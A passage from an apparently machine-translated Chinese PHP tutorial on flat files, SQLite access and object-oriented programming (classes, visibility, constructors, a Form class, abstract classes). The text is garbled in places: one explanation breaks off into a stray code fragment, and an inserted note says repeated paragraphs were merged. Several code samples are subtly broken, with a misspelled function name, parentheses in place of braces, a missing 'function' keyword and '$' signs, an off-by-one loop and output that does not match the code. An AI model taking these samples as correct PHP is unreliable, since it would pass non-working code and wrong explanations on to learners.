  \ `$line` 中。每个列条目都存储在数组的元素中。\n\n→16 这条语句测试输入文件中的行是否有文本。如果该行没有文本，则会在输出文件中存储一个新换行符。因此，输入文件中的任何空行都会存储在输出文件中。\n\
  \n→20 如果输入文件中的行不为空，则将其转换为制表符分隔格式并写入输出文件。\n\n→21 这条语句在一条语句中完成转换并将其写入输出文件。`implode`\
  \ 函数将数组 `$line` 转换为字符串，元素之间用制表符分隔。\n\n→27 当找不到输入文件时，执行此 `else` 块。回显错误信息，并返回 `false`。\n\
  \n→32 函数已成功完成，因此返回 `true`。\n\n→34 这一行调用该函数，并将变量 `$myfile` 中的文件名传递给函数。\n\n## 使用 SQLite\n\
  \n从 PHP 5.0 开始，PHP 默认包含了 SQLite 软件。SQLite 设计用于使用 SQL 查询将数据存储在平文件中。（SQL 的解释请参阅第五卷，第\
  \ 1 章。）\n\nSQLite 是在平文件中存储数据的快速、简单的方法。然而，它比数据库不安全，而且无法处理复杂数据。在大多数情况下，你应该将数据存储在 MySQL\
  \ 中，但您有时可能想将数据存储在平文件中。例如，您可能希望以其他程序（如 Excel）可以读取的格式写入数据。\n\n使用 SQLite 存储和检索数据与第五卷中描述\
  \ PHP 使用 MySQL 的方法类似。您使用 SQL 与数据文件通信，并使用 PHP 函数发送 SQL 和检索数据。您通过与数据库时相同的步骤与数据进行交互，如下：\n\
  \n1. 连接到数据文件。\n2. 发送 SQL 查询。\n3. 如果从数据文件中检索了数据，则处理这些数据。\n4. 关闭与数据文件的连接。\n\n以下是关于完成每个步骤的更多细节。\n\
  \n要连接到数据文件，使用以下 PHP 函数：\n\n```php\n$db = sqlite_open(\"testdb\");\n```\n\n此语句打开数据文件\
  \ `testdb`。如果文件不存在，函数将创建它。\n\n要发送 SQL 查询，使用 `sqlite_query` 函数，如下：\n\n```php\n$sql\
  \ = \"SELECT * FROM Product\";\n$result = sqlite_query($db,$sql);\n```\n\n检索到的数据以行和列的形式存储在临时表中。您可以使用\
  \ PHP 函数从临时数据表中检索一行，并将其存储在数组中，以字段名作为数组的键。语句如下：\n\n```php\n$row = sqlite_fetch_array($result);\n\
  ```\n\n执行此语句后，`$row` 是一个包含临时表中所有字段的数组，如下：\n\n```php\n$row['firstName'] = John\n\
  $row['lastName'] = Smith\n```\n\n要处理临时表中的所有数据，您循环一次获取一行，处理每行直到到达表格末尾，如下：\n\n```php\n\
  while($row=sqlite_fetch_asoc($result))\n{\n    foreach($row as $value)\n    {\n\
  \        echo \"$value<br />\";\n    }\n}\n```\n\n当您完成存储和/或检索数据时，可以使用以下语句关闭数据文件：\n\
  \n```php\nsqlite_close($db);\n```\n\nSQLite 的错误处理与 MySQL 的错误处理类似，正如第五卷第 5 章 or die(\"\
  Query failed: \".sqlite_error());\n$row = sqlite_fetch_array($result);\n```\n\n\
  第五卷中关于 MySQL 的大部分信息也适用于 SQLite。SQLite 的不同之处在于数据存储在平文件中，而不是由 MySQL 存储在 MySQL 特有的文件中。\n\
  \n# 第 4 章：面向对象编程\n\n## 本章内容\n\n- 理解面向对象编程\n- 规划面向对象的脚本\n- 理解面向对象编程\n- 定义和编写类\n-\
  \ 使用异常处理错误\n- 复制、比较和销毁对象\n\n面向对象编程（OOP）是一种使用类的编程方法。目前，Java 和 C++ 是流行语言。具有特性集的面向对象编程在\
  \ PHP 4 中是可能的。通过 PHP 5，PHP 的面向对象能力得到了极大提高。本章的示例脚本是为 PHP 5 编写。本章介绍了 OOP 概念，并关注它们如何应用于\
  \ PHP。\n\n## 介绍面向对象编程\n\n面向对象编程（有时简称 OOP）不仅仅是语法问题。它是分析编程问题的不同方式。应用程序通过对编程问题建模来设计。例如，设计支持公司销售部门应用程序的程序员可能会客户与销售之间的关系来考虑编程项目——换句话之，从销售部门的设计来看。\n\
  \n在面向对象编程中，脚本的元素是对象。对象代表了要解决的问题的元素。例如，如果脚本与二手车行有关，对象可能是汽车和客户。或者如果脚本与外太空有关，对象将是星和行星。\n\
  \n### 对象与类\n\n面向对象程序的基本元素是对象。最容易是将对象理解为物理对象。例如，汽车是一个对象。汽车具有属性（称为特征），如颜色、型号、发动机和轮胎。汽车也有可以做的事情，如前进、后退、停车、翻滚和假死（至少我们的车会）。\n\
  \n通常情况下，对象是名词。人是一个对象。动物、房屋、办公室、垃圾桶、外套、云朵、行星和按钮也是如此。然而，对象不仅仅是物理对象。就像名词一样，对象通常更抽象。例如，银行账户不是你可以拿在手里的东西，但它可以被视为一个对象。计算机账户或贷款也是如此。文件通常是一个对象。数据库也是。电子邮件、地址、歌曲、电视节目、会议和日期都可以是对象。\n\
  \n\n\n类（class）是 PHP 代码，作为模板或模式用于创建对象（object）。类定义了对象的属性（properties）。它还定义了对象可以执行的事情\
  \ —— 它的职责。例如，你写写了一个类，将汽车定义为四个轮子和一个引擎，并且该类列出了汽车可以做的事情，如向前移动和停车。然后，根据该类，你可以编写一条类似下所示语句来创建一个汽车对象：\n\
  \n```php\n$myCar = new Car();\n```\n\n对象 `$myCar` 是根据 `Car` 类中的定义创建的。你的新车拥有四个轮子和一个引擎，并且像\
  \ `Car` 类中定义的那样可以向前移动和停车。当你使用汽车对象 `$myCar` 时，你可能会发现它缺少了一些重要的东西，比如车门、方向盘或倒挡挡。这是因为当你在编写\
  \ `Car` 类时，漏掉了一个重要的项目。\n\n从更技术性的角度来看，对象是一个复杂的、用户定义的数据类型。从类创建对象的过程被称为实例化（instantiation）。对象是类的实例（instance）。例如，`$myCar`\
  \ 就是 `Car` 类的一个实例。\n\n作为编写类的人，你了解类内部是如何运作的。然而，使用从类创建的对象的人不需要知道对象是如何完成其职责的。大多数人并不知道电话对象是如何工作的，但他们可以使用它来拨打电话。制造电话的人知道内部发生了什么。当有新技术的出现时，电话制造者可以打开手机并对其进行改进。只要他不改变界面\
  \ —— 键盘和按钮 —— 就完全不会影响手机的使用。\n\n## 属性 (Properties)\n\n对象拥有属性，有时也称为特性（attributes）。汽车可以是红色的、绿色的，或者满是波点\
  \ —— 这是一个颜色属性。属性 —— 例如汽车的颜色、尺寸或型号 —— 存储在对象内部。属性在类中以变量的形式设置。例如，颜色属性存储在对象中的一个变量里，并给出一个描述性的名称，如\
  \ `$color`。因此，汽车对象 `$myCar` 可能包含 `$color = red`。\n\n存储属性的变量可以有默认值，可以在对象创建时赋予值，也可以在稍后添加或修改值。例如，`$myCar`\
  \ 对象创建时是红色的，但当稍后喷漆时，`$color` 属性被改为黄绿色（chartreuse）。\n\n## 方法 (Methods)\n\n对象可以执行的事情有时被称为职责。例如，一个\
  \ `Car` 对象可以向前移动、停止、后退和停车。对象可以做的每件事 —— 每一项职责 —— 都程序化的类中并被称为方法（method）。\n\n在 PHP\
  \ 中，方法使用的语法与函数相同。虽然代码看起来像函数代码，但区别在于方法在类内部。它不能脱离对象独立调用。PHP 不允许这样做。这种类型的函数只有在带对象调用时才能执行其任务。\n\
  \n在创建方法时，给它们起一个能够描述其功能的名称。例如，一个 `customerOrder` 类可能会有如 `displayOrder`、`getTotalCost`、`computeSalesTax`\
  \ 和 `cancelOrder` 等方法。方法与其他 PHP 实体一样，可以使用任何有效名称命名，但根据惯例，它们通常使用驼峰命名法（camel caps），此处所示。\n\
  \n方法是对象与世界其余部分的接口。对象为了所有职责都需要方法。对象应该只通过它们的方法与外部世界交互。例如，假设你的对象是一个待售的 `catalogItem`。它的它的属性之一是\
  \ `$price`。你不希望 `$price` 被一个简单的语句轻易更改，例如：\n\n```php\n$price = 10;\n```\n\n相反，你想要一个名为\
  \ `changePrice` 的方法作为编辑价格的唯一方式。该方法包含了检查，以确保只有合法用户可以使用它来更改价格。\n\n一个良好的对象应该包含执行职责所需的所有内容，但不要有大量的额外数据。它不应该执行另一个对象的职责。汽车对象应该行驶，并且应该拥有执行其职责所需的一切，如汽油、机油、轮胎、引擎等。汽车对象不应该做饭，也不需要有盐或煎锅。`cook`\
  \ 对象也不应该载送孩子去足球训练。\n\n## 继承 (Inheritance)\n\n对象应该只包含它们需要的属性和方法。不多不少，也不少。实现这一点的方法之一是通过使用继承（inheritance）在类之间共享属性和方法。例如，假设你有两个\
  \ `rose` 对象：一个是白玫瑰的，另一个是红玫瑰的。你可以写两个类：`redRose` 类和 `whiteRose` 类。然而，这两个对象的大很多信息是相同的。它们都是灌木，都有刺，并且都在六月开花。继承使你能够消除这种重复。\n\
  \n你可以写一个名为 `Rose` 的类。你可以在这个类中存储共同信息，例如 `$plant = bush`、 `$stem = thorns` 和 `$blooms\
  \ = June`。然后你可以为这两种玫瑰类型编写子类。`Rose` 类被称为主类（master class）或父类（parent class）。`redRose`\
  \ 和 `whiteRose` 是子类（subclasses），被称为子类（或正如一位喜欢的教授亲切称呼的那样称为孩子们”）。\n\n子类继承父类的所有属性和方法。但它们也可以拥有自己特定的属性，例如\
  \ `whiteRose` 类的 `$color = white` 和 `redRose` 类的 `$color = red`。\n\n子类可以包含与父类同名的方法。在这种情况下，子类中的方法优先优先。某些语言允许类继承多个父类，这被称为多重继承。PHP\
  \ 不允许多重继承。类只能继承一个父类。\n\n## 开发面向对象的脚本\n\n面向对象的脚本需要大量的规划。你需要规划你的对象、属性以及它们能做什么。你的对象需要涵盖所有的职责，而不侵入其他对象的职责。对于复杂的项目，你可能需要进行一些建模和测试，才能有足够的信心认为项目计划包含了所需的所有对象。\n\
  \n开发面向对象的脚本包括以下过程，这些过程将在后续章节中进行详细介绍：\n\n1. 选择对象。\n2. 为每个对象选择属性和方法。\n3. 创建对象并投入使用。\n\
  \n### 选择对象\n\n你的第一个任务是为你的编程项目开发对象列表。如果你独立工作且项目较小，对象可能是显而易见的。然而，如果你在一个大型复杂项目上工作，选择对象列表可能会变得困难。例如，如果你的项目是开发管理银行所有任务的软件，你的可能对象列表很大：账户、柜员、钱、支票簿、垃圾桶、保安、金库、报警系统、客户、贷款、利息等等。但是，你需要所有的对象吗？你的脚本要对大堂里的垃圾桶做什么？或者保安？嗯，你的脚本可能需要为保安安排班次。\n\
  \n当你规划面向对象的程序时，识别对象的最佳策略是列出你能想到的所有对象 —— 即与你的项目有任何相关的名词。有时，程序员可以从项目建议书文档中提取所有的名词，开发出一个相当全面的可能对象列表。\n\
  \n\n\n\n在你创建了一个长长的可能对象列表后，下一个任务是尽可能多删掉一些项。你应该消除任何重复项、职责重叠的对象以及与你的项目无关的对象。例如，如果你的项目涉及造汽车，那么你的汽车项目可能需要为汽车的每个部分创建一个对象。另一方面，如果你的项目涉及车库的交通控制，你可能只需要一个可以移动的汽车对象；汽车的零件对于这个项目并不重要。\n\
  \n### 为每个对象选择属性和方法\n\n当你拥有一份完整的对象列表时，就可以开始为每个对象开发属性列表了。问问自己你需要了解关于每个对象的什么。例如，对于一个汽车维修项目，你可能需要知道诸如汽车最后一次保养的时间、维修记录、任何事故、零件详情等信息。对于一个涉及车库交通的项目，你可能只需要知道汽车的尺寸。汽车在车库中占了多少空间？\n\
  \n你需要定义每个对象的职责，并且每个对象都应该是相互独立的。它需要拥有方法来处理它所承担的所有职责。例如，如果你的对象之一是银行账户，你需要知道银行账户需要做什么。首先，它需要被创建，因此你可以定义一个\
  \ `openNewAccount` 方法。它需要接受存款并进行取款。它需要跟踪余额。它在被询问时报告余额。它可能还需要定期向账户添加利息。这些活动很快就能想到。\n\
  \n然而，再多想一下，或者进行一些测试，可能会发现你忽略的活动。例如，账户存储了关于所有者的信息，如姓名和地址。你忘记包含一个在客户搬家时更新这些信息的方法了吗？与移动资金相比，这似乎是微不足道的，但如果你无法做到，它看起来就不再微不足道了。\n\
  \n### 创建和使用对象\n\n在你决定了对象的设计后，就可以创建并使用该对象。创建和使用对象的步骤如下：\n\n1. 编写 `class` 语句。\n  \
  \ `class` 语句是一个 PHP 语句，它是对象的蓝图。`class` 语句包含一个语句块，其中包含了对象拥有的所有属性和方法的 PHP 代码。\n\n\
  2. 在想要使用对象的脚本中包含该类。\n   你可以在脚本本身中编写 `class` 语句。但是，通常做法是将 `class` 语句保存在单独的文件，并使用\
  \ `include` 语句在需要使用对象的脚本开头包含该类。\n\n3. 在脚本中创建对象。\n   你使用 PHP 语句根据类创建一个对象。这被称为实例化。\n\
  \n4. 使用新对象。\n   在你创建了一个新对象后，可以使用它来执行操作。你可以使用 `class` 语句块内的任何方法。\n\n本章的其余部分提供了完成这些步骤所需的详细信息。\n\
  \n## 定义类\n\n在你确定了项目所需的对象、属性和方法后，就可以准备好定义类了。类（class）是对象的模板（模式）。\n\n#### 编写类语句\n\n\
  你通过编写 `class` 语句来定义类的类的属性和方法。`class` 语句具有以下通用格式：\n\n```\nclass className\n{\n  \
  \  添加定义属性的语句\n    添加所有方法\n}\n```\n\n![remember.eps](img/remember_fmt.png) 你对类名可以使用任何有效的\
  \ PHP 标识符，但 `stdClass` 除外。PHP 内部使用了 `stdClass` 这个名称，因此你不能使用这个名称。\n\n所有的属性设置和方法定义都包含在起始和结束的大括号中。如果你想让一个类成为继承属性和方法的子类，请使用类似下文的语句：\n\
  \n```\nclass whiteRose extends Rose\n{\n    添加属性语句\n    添加方法\n}\n```\n\n从该类创建的对象可以访问\
  \ `whiteRose` 子类和 `Rose` 类的所有属性和方法。然而，`Rose` 类无法访问子类 `whiteRose` 中的属性或方法。想象一下，子类拥有父类拥有的一切，但父类不拥有子类的任何东西。多么奇的想法。\n\
  \n接下来的几节将向你展示如何在 `class` 语句内部设置属性和定义方法。有关完整 `class` 语句的更全面的示例，请参阅本章后后的将它们整合在一起 节。\n\
  \n#### 设置属性\n\n当你在定义类时，在类的顶部声明所有属性，如下：\n\n```\nclass Car\n{\n    private $color;\n\
  \    private $tires;\n    private $gas;\n    方法语句\n}\n```\n\n![tip.eps](img/tip_fmt.png)\
  \ PHP 并不要求你声明变量。在本书讨论的其他 PHP 脚本中，变量并没有被声明，而是直接被使用。在类中也可以做同样的事情。然而，在类中声明属性要好得多。通过包含声明，类变得更容易理解。遗漏这一点是糟糕的编程习惯。\n\
  \n每个属性声明都以一个关键字开始，该关键字指定了如何访问属性。三个关键字是：\n\n- `public`: 属性可以从类外部访问，通过脚本或从另一个类。\n\
  - `private`: 属性不能从类外部访问，无论是通过脚本还是另一个类。\n- `protected`: 属性不能从类外部访问，除非是该类的类。\n\n![remember.eps](img/remember_fmt.png)\
  \ 类应该设计为通过方法来访问属性。通过将属性声明为 `private`，你可以确保它无法从脚本直接访问。\n\n如果你想为属性设置默认值，你可以这样做，但值是有限制的。你可以声明简单值，但不能声明计算值，详细所示：\n\
  \n![check](img/check.png) 以下变量声明作为默认值是允许：\n```\nprivate $color = \"black\";\nprivate\
  \ $gas = 10;\nprivate $tires = 4;\n```\n\n![check](img/check.png) 以下变量声明作为默认值是不允许的：\n\
  ```\nprivate $color = \"blue\".\"black\";\nprivate $gas = 10 - 3;\nprivate $tires\
  \ = 2 * 2;\n```\n\n变量声明中允许数组，只要值是简单的，如下：\n```\nprivate $doors = array(\"front\"\
  ,\"back\");\n```\n\n要在创建对象时设置或更改变量的值，请使用构造函数（见本章后面的编写构造函数节）或为此编写的方法。\n\n#### 使用\
  \ $this 访问属性\n\n在类内部，`$this` 是指向类属性的特殊变量。`$this` 不能在类外部使用。它被设计用于类内部语句访问同类的变量。\n\n\
  使用 `$this` 的格式如下：\n\n`$this->varname`\n\n例如，在一个拥有 `$totalCost` 属性的 `CustomerOrder`\
  \ 类中，你通过以下方式访问 `$totalCost`：\n\n`$this->totalCost`\n\n使用 `$this` 指向类内部的 `$totalCost`。你可以在任何一个语句中使用\
  \ `$this`，如下：\n\n```\n$this->totalCost = 200.25;\nif($this->totalCost > 1000)\n\
  $product[$this->size] = $price\n```\n\n正如你所看到的，你使用 `$this->varname` 的方式与使用 `$varname`\
  \ 完全相同。\n\n\n\n注意美元符号 (`$`) 出现在 `this` 之前，但在 `gas` 之前没有。不要在 `totalCost` 之前使用美元符号——例如\
  \ `$this->$totalCost`——因为这会改变你语句的含义。你可能会收到或不会收到错误信息，但它指的并不是当前类内部变量 `$totalCost`。\n\
  \n### 添加方法\n\n方法定义了对象可以做什么，它们在类中的编写格式与你编写函数的格式相同。例如，你的 `CustomerOrder` 可能需要一个方法将项目添加到订单的总成本中。你可以有一个名为\
  \ `total` 的变量，其中包含当前的总成本。你可以写一个方法，将项目的价格加到总成本中。你可以如下所示向你的类中添加这样的方法：\n\n```php\n\
  class CustomerOrder\n{\n  private $total = 0;\n  function addItem($amount)\n  {\n\
  \      $this->total = $this->total + $amount;\n      echo \"$amount was added; current\
  \ total is $this->total\";\n  }\n}\n```\n\n这看起来和任何其他函数一样，但因为它在类内部，所以它是一个方法。你可以在本微型书籍的第\
  \ 2 章中找到关于编写函数的详情。\n\n和函数一样，方法接受传递给它们的值。传递的值需要是正确的数据类型才能在函数中使用。（参见本微型书籍的第 1 章关于数据类型的讨论。）例如，在前面的示例中，`$amount`\
  \ 需要是一个数字。你的方法应该包含检查以确保该值是一个数字。例如，你可以这样写该方法：\n\n```php\nclass CustomerOrder\n{\n\
  \  private $total = 0.0;\n  function addItem($amount)\n  {\n      if(is_numeric($amount))\n\
  \      {\n          $this->total = $this->total + $amount;\n          echo \"$amount\
  \ added; current total is $this->total\";\n      }\n      else\n      (\n      \
  \    echo \"value passed is not a number.\";\n      )\n  }\n}\n```\n\n如果传递的值是整数、浮点数或代表数字的字符串，则加上该金额。如果不是，则显示错误信息。`$total`\
  \ 中的和是一个浮点数，因为它被赋值了一个带有小数点的数字。当传递的金额加到 `$sum` 时，PHP 会自动将其转换为浮点数。\n\n当你编写方法时，PHP\
  \ 允许你指定传递的值必须是数组或特定对象。指定期望的内容被称为类型提示（type hinting）。如果传递的值不是指定的类型，将显示错误信息。你不需要在方法中添加语句来检查数组或对象数据类型。例如，你可以如下所示指定向函数传递一个数组：\n\
  \n```php\nClass AddingMachine\n{\n    private $total = 0;\n    addNumbers(array\
  \ $numbers)\n    {\n      for($i=0;$i<=sizeof($numbers);$i++)\n      {\n       \
  \   $this->total = $this->total + $numbers[$i];\n      }\n    }\n}\n```\n\n如果你尝试向此方法传递一个不是数组的值，将显示一个类似下面的错误信息。\n\
  \n`Catchable fatal error:` `Argument 1 passed to AddingMachine::addNumbers() must\
  \ be an array, integer given,...`\n\n此错误说明传递了一个整数，而不是要求的数组。这是一个致命错误（fatal error），因此脚本在此处停止。你也可以如下所示指定传递的值必须是一个特定对象：\n\
  \n```php\nclass ShoppingCart\n{\n    private $items = array();\n    private $n_items\
  \ = 0;\n    function addItem( Item $item )\n    {\n      $this->items[] = $item;\n\
  \      $this->n_items = $this->n_items + 1;\n    }\n}\n```\n\n`ShoppingCart` 类将项目存储在数组中。`addItem`\
  \ 需要一个 `Item` 对象。`addItem` 方法将 `$item` 添加到 `$items` 数组并增加 `$n_items`。\n\n理解公共私有方法\n\
  \n属性和方法可以是公共（public）、私有的（private）或保护的（protected）。`public`意味着可以从类外部访问。`private`意味着只能在类内部访问。`protected`意味着可以在类内部以及其子类中访问。\n\
  \n在这个示例中，`gas` 属性是公共的，`addGas` 方法也是公共的。这允许与类进行交互：\n\n```php\nclass Car\n{\n  public\
  \ $gas = 0;\n  public function addGas($amount)\n  {\n      $this->gas = $this->gas\
  \ + $amount;\n      echo \"$amount added to gas tank\";\n  }\n}\n```\n\n然而，你可能希望确保人们不会直接加油。你可以让\
  \ `gas` 属性变为私有。你可以写成：\n\n```php\nclass Car\n{\n  private $gas = 0;\n  private function\
  \ addGas($amount)\n  {\n      $this->gas = $this->gas + $amount;\n      echo \"\
  $amount added to gas tank\";\n  }\n}\n```\n\n有了这个类，从外部给汽车加油的唯一方法是使用 `buyGas` 方法。`buyGas`\
  \ 方法使用 `addGas` 方法给汽车加油，但 `addGas` 方法因为是私有的，不能在类外部使用。\n\n```php\nclass Car\n{\n\
  \  private $gas = 0;\n  private function addGas($amount)\n  {\n      $this->gas\
  \ = $this->gas + $amount;\n      echo \"$amount added to gas tank\";\n  }\n  public\
  \ function buyGas($amount)\n  {\n      $this->addGas($amount);\n  }\n}\n```\n\n\
  现在，如果类外部的语句尝试使用 `addGas`，如下所示，将显示一个致命错误，就像对于私有属性一样：\n\n```php\n$new_car = new Car();\n\
  $new_car->addGas(5);\n```\n\n然而，类外部的语句现在可以通过 `buyGas` 方法给汽车加油，如下所示：\n\n```php\n\
  $new_car = new Car();\n$new_car->buyGas(5);\n```\n\n你将看到以下输出：\n\n`5 gallons added\
  \ to gas tank`\n\n![tip.eps](img/tip_fmt.png) 良好的编程习惯是尽可能地隐藏你的类内容。将所有属性设为私有。只有当方法绝对需要是公共时，才将它们设为公共。\n\
  \n### 编写构造函数\n\n\n\n\n构造函数是一个特殊的方法，在 PHP 5 中引入，它在使用类作为模板创建对象时被执行。构造函数不是必须的，如果你不想在创建对象时设置任何属性值或执行任何操作，就不需要使用构造函数。只允许一个构造函数。\n\
  \n构造函数有一个特殊的名称，以便 PHP 知道在创建对象时执行该方法。构造函数命名为 `__construct`（两个下划线）。构造方法的方法的形式 get\
  \ 所示：\n\n```php\nfunction __construct()\n{\n    $this->total = 0;   # 总计从 0 开始\n\
  }\n```\n\n此构造函数定义了新的 `CustomerOrder`。当订单创建时，总费用为 0。\n\n![technicalstuff.eps](img/technicalstuff_fmt.png)\
  \ 在 PHP 5 之前，构造函数的名称与类名相同。你可能会遇到用这种旧样式编写的类。PHP 5 及之后的脚本会首先查找名为 `__construct()` 的方法作为构造函数。如果没有找到，它会寻找与类名同名的方法并使用该方法作为构造函数。因此，旧的类在\
  \ PHP 5 和 PHP 6 下仍然可以运行。\n\n## 整合在一起\n\n你的类可以根据需要拥有尽可能少的属性和方法。方法可以是简单的也可以是复杂的，但面向对象编程的目标是让方法尽可能简单合理。与其将所有内容都挤进一个方法中，不如编写几个较小的方法，并在需要让一个方法调用另一个方法。\n\
  \n以下是一个简单的类：\n\n```php\nclass MessageHandler\n{\n    private $message;\n    function\
  \ __construct($message)\n    {\n        $this->message = $message;\n    }\n    function\
  \ displayMessage()\n    {\n        echo $this->message.\"\\n\";\n    }\n}\n```\n\
  \n该类有一个属性 — `$message` —— 用于存储消息。消息存储在构造函数中。\n\n该类有一个方法 — `displayMessage`。输出存储的消息是\
  \ `messageHandler` 对象所能做的唯一一件事。\n\n假设你想添加一个方法，将消息更改为小写然后自动显示消息。编写该扩展类的最佳方式如下：\n\n\
  ```php\nclass MessageHandler\n{\n    private $message;\n    function __construct($message)\n\
  \    {\n        $this->message = $message;\n    }\n    function displayMessage()\n\
  \    {\n        echo $this->message.\"\\n\";\n    }\n    function lowerCaseMessage()\n\
  \    {\n        $this->message = strtolower($this->message);\n        $this->displayMessage();\n\
  \    }\n}\n```\n\n注意 `lowerCaseMessage()` 方法。由于类已经有一个显示消息的方法，因此这个新的 `lowerCaseMessage()`\
  \ 方法使用了现有的 `displayMessage()` 方法，而不是重复 `echo` 语句。\n\n![tip.eps](img/tip_fmt.png)\
  \ 每当你编写一个方法并发现自己正在编写已经在同一个类的另一个方法中写过的代码时，你就需要重新设计这些方法。通常情况下，你不应该在同一个类中有任何重复的代码。\n\
  \n列表 4-1 中的示例是一个复杂的类，可以用于创建 HTML 表单。为了简化示例，表单只包含文本输入字段。\n\n### 列表 4-1：一个包含表单对象类的脚本\n\
  \n```php\n<?php\n/* 类名：Form\n* 描述：创建一个简单的 HTML 表单类\n*              仅包含文本输入字段。该\n\
  *              类有 3 个方法。\n*/\nclass Form\n{\n  private $fields = array();  # 包含字段名称和标签\n\
  \  private $actionValue;     # 处理表单的脚本名称\n  private $submit = \"Submit Form\"; #\
  \ 提交按钮上的值\n  private $Nfields = 0; # 添加到表单的字段数量\n  /* 构造函数：用户传递发送表单数据的脚本名称\n  *\
  \ ($actionValue) 并在在提交按钮上显示的值。\n  */\n  function __construct($actionValue,$submit)\n\
  \  {\n    $this->actionValue = $actionValue;\n    $this->submit = $submit;\n  }\n\
  \  /* 显示表单。显示表单。\n  */\n  function displayForm()\n  {\n    echo \"\\n<form action='{$this->actionValue}'method='POST'>\"\
  ;\n    for($j=1;j<=sizeof($this->fields);$j++)\n    {\n      echo \"<p style='clear:\
  \ left; margin: 0; padding: 0; padding-top: 5px'>\";\n      echo \"<label style='float:\
  \ left; width:20%'>{$this->fields[$j-1]['label']}: </label>\";\n      echo \"<input\
  \ style='width:200px' type='text' name='{$this->fields[$j-1]['name']}></p>\";\n\
  \    }\n    echo \"<input type='submit' value='{$this->submit}' style='margin-left:\
  \ 25%; margin-top: 10px'>\";\n    echo \"</form>\";\n  }\n  /* 向表单添加字段的函数。用户需要\n\
  \  * 发送字段名称和要显示的标签。\n  */\n  function addField($name,$label)\n  {\n    $this->fields[$this->Nfields]['name']\
  \ = $name;\n    $this->fields[$this->Nfields]['label'] = $label;\n    $this->Nfields++;\n\
  \  }\n}\n?>\n```\n\n该类包含四个属性和三个方法。属性如下：\n\n![check.png) `$fields`: 包含字段名称和标签的数组。\n\
  \n![check.png) `$actionValue`: 处理表单的脚本名称。\n\n![check.png) `$submit`: 提交按钮上的值。\n\n\
  ![check.png) `$Nfields`: 添加到表单的字段数量。\n\n方法如下：\n\n![check.png) `__construct`: 用户传递发送表单数据的脚本名称，以及在提交按钮上显示的值。\n\
  \n![check.png) `addField`: 向表单添加字段的函数。\n\n![check.png) `displayForm`: 显示表单。\n\n\
  ## 在脚本中使用类\n\n类代码需要位于使用类的脚本中。通常，类存储在独立的文件中，并包含在任何使用它的脚本中。\n\n使用对象时，你首先从类创建对象。然后该对象就可以执行类包含的所有方法。创建对象被称为实例化对象。正如你可以使用模式创建许多相似但独立的连衣裙一样，你可以使用类创建许多相似但独立的对象。\n\
  \n```\n$Joe = new Person(\"male\");\n$car_Joe = new Car(\"red\");\n$car_Sam = new\
  \ Car(\"green\");\n$customer1 = new Customer(\"Smith\",\"Joe\",$custID);\n```\n\n\
  对象存储在变量名中，构造函数方法被执行。现在你可以使用以下格式的语句使用类中的任何方法：\n\n```php\n$Joe->goToWork();\n$car_Joe->park(\"\
  illegal\");\n$car_Sam->paintCar(\"blue\");\n$name = $customer1->getName();\n```\n\
  \n\n\n从同一个类创建的不同对象是相互独立的个体。Sam 的车被涂成了蓝色，但 Joe 的车仍然是红色的。Joe 收到了停车罚单，但这并没有影响 Sam。\n\
  \nListing 4-2 中所示脚本展示了如何使用在前节中创建并在 Listing 4-1 中展示的 `Form` 类。\n\n### 列表 4-2：创建一个表单的脚本\n\
  \n```php\n<?php\n/* Script name: buildForm\n* Description: 使用表单创建一个简单的 HTML 表单\n\
  */\nrequire_once(\"Form.class\");\necho \"<html><head><title>Phone form</title></head><body>\"\
  ;\n$phone_form = new Form(\"process.php\",\"Submit Phone\");\n$phone_form->addField(\"\
  first_name\",\"First Name\");\n$phone_form->addField(\"last_name\",\"Last Name\"\
  );\n$phone_form->addField(\"phone\",\"Phone\");\necho \"<h3>Please fill out the\
  \ following form:</h3>\";\n$phone_form->displayForm();\necho \"</body></html>\"\
  ;\n?>\n```\n\n首先，脚本包含了包含 `Form` 类的文件。该类存储在 `Form.class` 文件中。脚本创建了一个名为 `$phone_form`\
  \ 的新表单对象。通过 `addField` 方法添加了三个字段。通过 `displayForm` 方法显示表单。注意此脚本还输出了一些额外的 HTML 代码。这些\
  \ HTML 代码同样很容易地添加到 `displayForm` 方法中。\n\n该脚本使用 `Form` 类创建了一个包含三个字段的表单。图 4-1 显示了生成的网页。\n\
  \n![9781118213704-fg040401.tif](img/9781118213704-fg040401_fmt.png)\n\n**图 4-1：**\
  \ Listing 4-2 中脚本显示的表单。\n\n## 在抽象类和接口中使用抽象方法\n\n你可以使用抽象方法来指定要传递的信息，但不包含任何代码，我们将在接下来的章节中告诉你如何操作。抽象方法是在\
  \ PHP 5 中引入的。你可以在抽象类或接口中使用抽象方法。抽象类同时包含抽象方法和非抽象方法。接口只包含抽象方法。\n\n#### 使用抽象类\n\n任何拥有抽象方法的类都必须声明为抽象类。抽象类的功能是充当子类的父类。你不能从抽象类实例化对象。\n\
  \n抽象类指定了子类的方法。子类必须实现父类中定义的抽象方法，尽管每个子类可以使用不同的代码以不同的方式实现该方法。如果父类中指定的抽象方法没有包含子类中，则会发生致命错误（fatal\
  \ error）。\n\n抽象方法指定了传递的值，称为签名（signature）。抽象方法的子类实现必须使用相同的签名。子类必须定义具有相同或更弱可见性的方法。例如，如果抽象方法被声明为\
  \ `protected`，则该方法的子类实现必须声明为 `protected` 或 `public`。\n\n以下代码展示了抽象类的使用。定义了一个名为 `Message`\
  \ 的抽象类，然后定义了两个子类。\n\n```php\nabstract class Message\n{\n  protected message_content;\n\
  \  function __construct($text)\n  {\n      $this->message_content = $text;\n  }\n\
  \  abstract public function displayMessage($color);\n}\n\nclass GiantMessage extends\
  \ Message\n{\n  public function displayMessage($color)\n  {\n      echo \"<h1 style='color:\
  \ $color'>\n              $this->message_content</h1>\";\n  }\n}\n\nclass BigMessage\
  \ extends Message\n{\n  public function displayMessage($color)\n  {\n      echo\
  \ \"<h2 style='color: $color'>\n              $this->message_content</h2>\";\n \
  \ }\n}\n```\n\n抽象类 `Message` 包含一个名为 `displayMessage` 的抽象方法。该抽象方法在两个子类——`GiantMessage`\
  \ 和 `BigMessage` 中得到了实现。在 `GiantMessage` 中，消息内容使用 `<h1>` 标签以传递给方法的颜色显示。在 `BigMessage`\
  \ 中，消息使用 `<h2>` 标签以传递的颜色显示。因此，两个子类都实现了该抽象方法。\n\n（注：输入文本中存在大量重复段落，已根据要求进行合并以确保清晰度。）\n\
  \n\n\nPHP 提供了一个名为 `Exception` 的错误处理类。你可以使用这个类来处理脚本中发生的非预期情况。当你定义的非预期情况发生时，方法中的代码会创建一个异常对象（exception\
  \ object）。在面向对象的术语中，这被称为抛出异常（throwing an exception）。然后，当你使用该类时，检查是否抛出了异常并执行指定的动作。\n\
